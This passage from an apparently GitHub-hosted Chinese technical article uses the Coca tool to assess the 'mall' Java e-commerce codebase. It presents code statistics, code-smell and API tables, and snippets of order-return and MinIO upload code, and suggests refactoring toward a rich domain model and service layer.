&lt;span class="pl-k"&gt;public&lt;/span&gt; &lt;span class="pl-k"&gt;int&lt;/span&gt; updateStatus(&lt;span class="pl-smi"&gt;Long&lt;/span&gt; id, &lt;span class="pl-smi"&gt;OmsUpdateStatusParam&lt;/span&gt; statusParam) {
    &lt;span class="pl-smi"&gt;Integer&lt;/span&gt; status &lt;span class="pl-k"&gt;=&lt;/span&gt; statusParam&lt;span class="pl-k"&gt;.&lt;/span&gt;getStatus();
    &lt;span class="pl-smi"&gt;OmsOrderReturnApply&lt;/span&gt; returnApply &lt;span class="pl-k"&gt;=&lt;/span&gt; &lt;span class="pl-k"&gt;new&lt;/span&gt; &lt;span class="pl-smi"&gt;OmsOrderReturnApply&lt;/span&gt;();
    &lt;span class="pl-k"&gt;if&lt;/span&gt;(status&lt;span class="pl-k"&gt;.&lt;/span&gt;equals(&lt;span class="pl-c1"&gt;1&lt;/span&gt;)){
        &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;//&lt;/span&gt;确认退货&lt;/span&gt;
        returnApply&lt;span class="pl-k"&gt;.&lt;/span&gt;setId(id);
        returnApply&lt;span class="pl-k"&gt;.&lt;/span&gt;setStatus(&lt;span class="pl-c1"&gt;1&lt;/span&gt;);
        returnApply&lt;span class="pl-k"&gt;.&lt;/span&gt;setReturnAmount(statusParam&lt;span class="pl-k"&gt;.&lt;/span&gt;getReturnAmount());
        returnApply&lt;span class="pl-k"&gt;.&lt;/span&gt;setCompanyAddressId(statusParam&lt;span class="pl-k"&gt;.&lt;/span&gt;getCompanyAddressId());
        returnApply&lt;span class="pl-k"&gt;.&lt;/span&gt;setHandleTime(&lt;span class="pl-k"&gt;new&lt;/span&gt; &lt;span class="pl-smi"&gt;Date&lt;/span&gt;());
        returnApply&lt;span class="pl-k"&gt;.&lt;/span&gt;setHandleMan(statusParam&lt;span class="pl-k"&gt;.&lt;/span&gt;getHandleMan());
        returnApply&lt;span class="pl-k"&gt;.&lt;/span&gt;setHandleNote(statusParam&lt;span class="pl-k"&gt;.&lt;/span&gt;getHandleNote());
    }&lt;span class="pl-k"&gt;else&lt;/span&gt; &lt;span class="pl-k"&gt;if&lt;/span&gt;(status&lt;span class="pl-k"&gt;.&lt;/span&gt;equals(&lt;span class="pl-c1"&gt;2&lt;/span&gt;)){
        &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;//&lt;/span&gt;完成退货&lt;/span&gt;
        returnApply&lt;span class="pl-k"&gt;.&lt;/span&gt;setId(id);
        returnApply&lt;span class="pl-k"&gt;.&lt;/span&gt;setStatus(&lt;span class="pl-c1"&gt;2&lt;/span&gt;);
        returnApply&lt;span class="pl-k"&gt;.&lt;/span&gt;setReceiveTime(&lt;span class="pl-k"&gt;new&lt;/span&gt; &lt;span class="pl-smi"&gt;Date&lt;/span&gt;());
        returnApply&lt;span class="pl-k"&gt;.&lt;/span&gt;setReceiveMan(statusParam&lt;span class="pl-k"&gt;.&lt;/span&gt;getReceiveMan());
        returnApply&lt;span class="pl-k"&gt;.&lt;/span&gt;setReceiveNote(statusParam&lt;span class="pl-k"&gt;.&lt;/span&gt;getReceiveNote());
    }
		&lt;span class="pl-c1"&gt;...&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;嗯，这是一个典型的贫血模型设计，这些业务逻辑都可以内聚到领域模型中。&lt;/p&gt;
&lt;p&gt;所以，我们有了初步的结论，可以尝试的内容：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;典型三层架构。可以业务维度重新做分层架构&lt;/li&gt;
&lt;li&gt;贫血模型。可以重构到充血模型&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;&lt;a id="user-content-工具评估" class="anchor" aria-hidden="true" href="#工具评估"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;工具评估&lt;/h3&gt;
&lt;p&gt;现在，是时候拿出我的 Coca：&lt;a href="https://github.com/phodal/coca"&gt;https://github.com/phodal/coca&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-代码统计" class="anchor" aria-hidden="true" href="#代码统计"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;代码统计&lt;/h4&gt;
&lt;p&gt;执行一下 &lt;code&gt;coca cloc&lt;/code&gt; 可以看看项目的行数统计：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;───────────────────────────────────────────────────────────────────────────────
Language                 Files     Lines   Blanks  Comments     Code Complexity
───────────────────────────────────────────────────────────────────────────────
Java                       471     80837    16265      2276    62296       1405
XML                        112     21710       61       119    21530          0
YAML                        12       430       36         8      386          0
Markdown                    10      1211      271         0      940          0
JSON                         8   1345664        0         0  1345664          0
gitignore                    6       119       15        17       87          0
Shell                        3        46        0         3       43          0
SVG                          2      6132        0       988     5144          0
License                      1       201       32         0      169          0
Properties File              1         4        0         0        4          0
SQL                          1      2192      143       440     1609          0
───────────────────────────────────────────────────────────────────────────────
Total                      627   1458546    16823      3851  1437872       1405
───────────────────────────────────────────────────────────────────────────────
Estimated Cost to Develop $55,872,945
Estimated Schedule Effort 70.766444 months
Estimated People Required 93.525243
───────────────────────────────────────────────────────────────────────────────
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;&lt;a id="user-content-基本情况评估" class="anchor" aria-hidden="true" href="#基本情况评估"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;基本情况评估&lt;/h4&gt;
&lt;p&gt;先执行一下 &lt;code&gt;coca analysis&lt;/code&gt;，然后 &lt;code&gt;coca evalute&lt;/code&gt;，得到一个基本的情况&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;TYPE&lt;/th&gt;
&lt;th&gt;COUNT&lt;/th&gt;
&lt;th&gt;LEVEL&lt;/th&gt;
&lt;th&gt;TOTAL&lt;/th&gt;
&lt;th&gt;RATE&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Nullable / Return Null&lt;/td&gt;
&lt;td&gt;21&lt;/td&gt;
&lt;td&gt;Method&lt;/td&gt;
&lt;td&gt;13757&lt;/td&gt;
&lt;td&gt;0.15%&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Utils&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;Class&lt;/td&gt;
&lt;td&gt;604&lt;/td&gt;
&lt;td&gt;0.33%&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Static Method&lt;/td&gt;
&lt;td&gt;7&lt;/td&gt;
&lt;td&gt;Method&lt;/td&gt;
&lt;td&gt;13757&lt;/td&gt;
&lt;td&gt;0.01%&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Average Method Num.&lt;/td&gt;
&lt;td&gt;13757&lt;/td&gt;
&lt;td&gt;Method/Class&lt;/td&gt;
&lt;td&gt;604&lt;/td&gt;
&lt;td&gt;22.776490&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Method Num. Std Dev / 标准差&lt;/td&gt;
&lt;td&gt;13757&lt;/td&gt;
&lt;td&gt;Class&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;52.137890&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Average Method Length&lt;/td&gt;
&lt;td&gt;46177&lt;/td&gt;
&lt;td&gt;Without Getter/Setter&lt;/td&gt;
&lt;td&gt;11218&lt;/td&gt;
&lt;td&gt;4.116331&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Method Length Std Dev / 标准差&lt;/td&gt;
&lt;td&gt;13757&lt;/td&gt;
&lt;td&gt;Method&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;2.928149&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;从数据上看，静态方法只有 7 个，返回 null 的情况有 21 个，保持得不错。项目的平均方法长度也还行，就是平均方法有点多。&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-代码坏味道评估" class="anchor" aria-hidden="true" href="#代码坏味道评估"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;代码坏味道评估&lt;/h4&gt;
&lt;p&gt;接着试试 &lt;code&gt;coca bs -s=type&lt;/code&gt; 来查看代码中的常见坏味道，限于篇幅的原因这里就不复杂了，说主要问题：大的类一共有 72 个，其中 OmsOrderExample.java 类，在没有 set/get 的情况下有 576 个方法。查看了一下引用情况，好像是来看数据库查询用的……：&lt;/p&gt;
&lt;div class="highlight highlight-source-java"&gt;&lt;pre&gt;&lt;span class="pl-k"&gt;public&lt;/span&gt; &lt;span class="pl-smi"&gt;Criteria&lt;/span&gt; andProductSnLike(&lt;span class="pl-smi"&gt;String&lt;/span&gt; value) {
    addCriterion(&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;product_sn like&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;, value, &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;productSn&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;);
    &lt;span class="pl-k"&gt;return&lt;/span&gt; (&lt;span class="pl-smi"&gt;Criteria&lt;/span&gt;) &lt;span class="pl-c1"&gt;this&lt;/span&gt;;
}&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这要重构的话是个体力活，详细见 &lt;a href="coca_reporter/bs.json"&gt;coca_reporter/bs.json&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-架构评估" class="anchor" aria-hidden="true" href="#架构评估"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;架构评估&lt;/h4&gt;
&lt;p&gt;执行了一下 &lt;code&gt;coca arch&lt;/code&gt;，由于是扁平的三层架构，没有太多的问题。&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-api-评估" class="anchor" aria-hidden="true" href="#api-评估"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;API 评估&lt;/h4&gt;
&lt;p&gt;执行 &lt;code&gt;coca api -c -r com.macro.mall.&lt;/code&gt; 获得基本的 API 列表情况：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;SIZE&lt;/th&gt;
&lt;th&gt;METHOD&lt;/th&gt;
&lt;th&gt;URI&lt;/th&gt;
&lt;th&gt;CALLER&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;GET&lt;/td&gt;
&lt;td&gt;/prefrenceArea/listAll&lt;/td&gt;
&lt;td&gt;controller.CmsPrefrenceAreaController.listAll&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;GET&lt;/td&gt;
&lt;td&gt;/subject/listAll&lt;/td&gt;
&lt;td&gt;controller.CmsSubjectController.listAll&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;18&lt;/td&gt;
&lt;td&gt;GET&lt;/td&gt;
&lt;td&gt;/subject/list&lt;/td&gt;
&lt;td&gt;controller.CmsSubjectController.getList&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;28&lt;/td&gt;
&lt;td&gt;POST&lt;/td&gt;
&lt;td&gt;/minio/upload&lt;/td&gt;
&lt;td&gt;controller.MinioController.upload&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;13&lt;/td&gt;
&lt;td&gt;POST&lt;/td&gt;
&lt;td&gt;/minio/delete&lt;/td&gt;
&lt;td&gt;controller.MinioController.delete&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;GET&lt;/td&gt;
&lt;td&gt;/companyAddress/list&lt;/td&gt;
&lt;td&gt;controller.OmsCompanyAddressController.list&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;18&lt;/td&gt;
&lt;td&gt;GET&lt;/td&gt;
&lt;td&gt;/order/list&lt;/td&gt;
&lt;td&gt;controller.OmsOrderController.list&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;11&lt;/td&gt;
&lt;td&gt;POST&lt;/td&gt;
&lt;td&gt;/order/update/delivery&lt;/td&gt;
&lt;td&gt;controller.OmsOrderController.delivery&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;11&lt;/td&gt;
&lt;td&gt;POST&lt;/td&gt;
&lt;td&gt;/order/update/close&lt;/td&gt;
&lt;td&gt;controller.OmsOrderController.close&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;11&lt;/td&gt;
&lt;td&gt;POST&lt;/td&gt;
&lt;td&gt;/order/delete&lt;/td&gt;
&lt;td&gt;controller.OmsOrderController.delete&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;这里的 size 指的是调用的方法里，这里的 MinioController 的 upload 方法里一共调用了 28 个方法，打开一看：&lt;/p&gt;
&lt;div class="highlight highlight-source-java"&gt;&lt;pre&gt;&lt;span class="pl-k"&gt;@ApiOperation&lt;/span&gt;(&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;文件上传&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;)
&lt;span class="pl-k"&gt;@RequestMapping&lt;/span&gt;(&lt;span class="pl-c1"&gt;value&lt;/span&gt; &lt;span class="pl-k"&gt;=&lt;/span&gt; &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;/upload&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;, &lt;span class="pl-c1"&gt;method&lt;/span&gt; &lt;span class="pl-k"&gt;=&lt;/span&gt; &lt;span class="pl-smi"&gt;RequestMethod&lt;/span&gt;&lt;span class="pl-c1"&gt;&lt;span class="pl-k"&gt;.&lt;/span&gt;POST&lt;/span&gt;)
&lt;span class="pl-k"&gt;@ResponseBody&lt;/span&gt;
&lt;span class="pl-k"&gt;public&lt;/span&gt; &lt;span class="pl-smi"&gt;CommonResult&lt;/span&gt; upload(&lt;span class="pl-k"&gt;@RequestParam&lt;/span&gt;(&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;file&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;) &lt;span class="pl-smi"&gt;MultipartFile&lt;/span&gt; file) {
    &lt;span class="pl-k"&gt;try&lt;/span&gt; {
        &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;//&lt;/span&gt;创建一个MinIO的Java客户端&lt;/span&gt;
        &lt;span class="pl-smi"&gt;MinioClient&lt;/span&gt; minioClient &lt;span class="pl-k"&gt;=&lt;/span&gt; &lt;span class="pl-k"&gt;new&lt;/span&gt; &lt;span class="pl-smi"&gt;MinioClient&lt;/span&gt;(&lt;span class="pl-c1"&gt;ENDPOINT&lt;/span&gt;, &lt;span class="pl-c1"&gt;ACCESS_KEY&lt;/span&gt;, &lt;span class="pl-c1"&gt;SECRET_KEY&lt;/span&gt;);
        &lt;span class="pl-k"&gt;boolean&lt;/span&gt; isExist &lt;span class="pl-k"&gt;=&lt;/span&gt; minioClient&lt;span class="pl-k"&gt;.&lt;/span&gt;bucketExists(&lt;span class="pl-c1"&gt;BUCKET_NAME&lt;/span&gt;);
        &lt;span class="pl-c1"&gt;...&lt;/span&gt;
        minioClient&lt;span class="pl-k"&gt;.&lt;/span&gt;putObject(&lt;span class="pl-c1"&gt;BUCKET_NAME&lt;/span&gt;, objectName, file&lt;span class="pl-k"&gt;.&lt;/span&gt;getInputStream(), file&lt;span class="pl-k"&gt;.&lt;/span&gt;getContentType());
        &lt;span class="pl-c1"&gt;LOGGER&lt;/span&gt;&lt;span class="pl-k"&gt;.&lt;/span&gt;info(&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;文件上传成功!&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;);
        &lt;span class="pl-smi"&gt;MinioUploadDto&lt;/span&gt; minioUploadDto &lt;span class="pl-k"&gt;=&lt;/span&gt; &lt;span class="pl-k"&gt;new&lt;/span&gt; &lt;span class="pl-smi"&gt;MinioUploadDto&lt;/span&gt;();
        minioUploadDto&lt;span class="pl-k"&gt;.&lt;/span&gt;setName(filename);
        minioUploadDto&lt;span class="pl-k"&gt;.&lt;/span&gt;setUrl(&lt;span class="pl-c1"&gt;ENDPOINT&lt;/span&gt; &lt;span class="pl-k"&gt;+&lt;/span&gt; &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;/&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; &lt;span class="pl-k"&gt;+&lt;/span&gt; &lt;span class="pl-c1"&gt;BUCKET_NAME&lt;/span&gt; &lt;span class="pl-k"&gt;+&lt;/span&gt; &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;/&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; &lt;span class="pl-k"&gt;+&lt;/span&gt; objectName);
        &lt;span class="pl-k"&gt;return&lt;/span&gt; &lt;span class="pl-smi"&gt;CommonResult&lt;/span&gt;&lt;span class="pl-k"&gt;.&lt;/span&gt;success(minioUploadDto);
    } &lt;span class="pl-k"&gt;catch&lt;/span&gt; (&lt;span class="pl-smi"&gt;Exception&lt;/span&gt; e) {
        &lt;span class="pl-c1"&gt;LOGGER&lt;/span&gt;&lt;span class="pl-k"&gt;.&lt;/span&gt;info(&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;上传发生错误: {}！&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;, e&lt;span class="pl-k"&gt;.&lt;/span&gt;getMessage());
    }
    &lt;span class="pl-k"&gt;return&lt;/span&gt; &lt;span class="pl-smi"&gt;CommonResult&lt;/span&gt;&lt;span class="pl-k"&gt;.&lt;/span&gt;failed();
}&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;嗯，它可能需要一个 service，而考虑到 Minio 是一个云存储服务器，还需要通过接口来封装这些细节。&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-api-架构图" class="anchor" aria-hidden="true" href="#api-架构图"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;API 架构图&lt;/h4&gt;
&lt;p&gt;在生成 API 结果之后，可以打开 &lt;code&gt;coca_reporter/arch.svg&lt;/code&gt; 查看项目的架构图。不过，由于项目的 API 较多，便需要一个个分析，所以你可以通过 &lt;code&gt;coca api -c -r com.macro.mall. -a /order&lt;/code&gt; 查看 /order 的所有接口情况：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;SIZE&lt;/th&gt;
&lt;th&gt;METHOD&lt;/th&gt;
&lt;th&gt;URI&lt;/th&gt;
&lt;th&gt;CALLER&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;17&lt;/td&gt;
&lt;td&gt;GET&lt;/td&gt;
&lt;td&gt;/order/list&lt;/td&gt;
&lt;td&gt;controller.OmsOrderController.list&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;11&lt;/td&gt;
&lt;td&gt;POST&lt;/td&gt;
&lt;td&gt;/order/update/delivery&lt;/td&gt;
&lt;td&gt;controller.OmsOrderController.delivery&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;11&lt;/td&gt;
&lt;td&gt;POST&lt;/td&gt;
&lt;td&gt;/order/update/close&lt;/td&gt;
&lt;td&gt;controller.OmsOrderController.close&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;11&lt;/td&gt;
&lt;td&gt;POST&lt;/td&gt;
&lt;td&gt;/order/delete&lt;/td&gt;
&lt;td&gt;controller.OmsOrderController.delete&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;GET&lt;/td&gt;
&lt;td&gt;/order/{id}&lt;/td&gt;
&lt;td&gt;controller.OmsOrderController.detail&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;11&lt;/td&gt;
&lt;td&gt;POST&lt;/td&gt;
&lt;td&gt;/order/update/receiverInfo&lt;/td&gt;
&lt;td&gt;controller.OmsOrderController.updateReceiverInfo&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;11&lt;/td&gt;
&lt;td&gt;POST&lt;/td&gt;
&lt;td&gt;/order/update/moneyInfo&lt;/td&gt;
&lt;td&gt;controller.OmsOrderController.updateReceiverInfo&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;11&lt;/td&gt;
&lt;td&gt;POST&lt;/td&gt;
&lt;td&gt;/order/update/note&lt;/td&gt;
&lt;td&gt;controller.OmsOrderController.updateNote&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;GET&lt;/td&gt;
&lt;td&gt;/orderSetting/{id}&lt;/td&gt;
&lt;td&gt;controller.OmsOrderSettingController.getItem&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;11&lt;/td&gt;
&lt;td&gt;POST&lt;/td&gt;
&lt;td&gt;/orderSetting/update/{id}&lt;/td&gt;
&lt;td&gt;controller.OmsOrderSettingController.update&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;POST&lt;/td&gt;
&lt;td&gt;/order/generateConfirmOrder&lt;/td&gt;
&lt;td&gt;portal.controller.OmsPortalOrderController.generateConfirmOrder&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;POST&lt;/td&gt;
&lt;td&gt;/order/generateOrder&lt;/td&gt;
&lt;td&gt;portal.controller.OmsPortalOrderController.generateOrder&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;POST&lt;/td&gt;
&lt;td&gt;/order/paySuccess&lt;/td&gt;
&lt;td&gt;portal.controller.OmsPortalOrderController.paySuccess&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;POST&lt;/td&gt;
&lt;td&gt;/order/cancelTimeOutOrder&lt;/td&gt;
&lt;td&gt;portal.controller.OmsPortalOrderController.cancelTimeOutOrder&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;POST&lt;/td&gt;
&lt;td&gt;/order/cancelOrder&lt;/td&gt;
&lt;td&gt;portal.controller.OmsPortalOrderController.cancelOrder&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;结果见下图（建议新窗口打开）&lt;/p&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="coca_reporter/api.svg"&gt;&lt;img src="coca_reporter/api.svg" alt="Coca Reporter" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
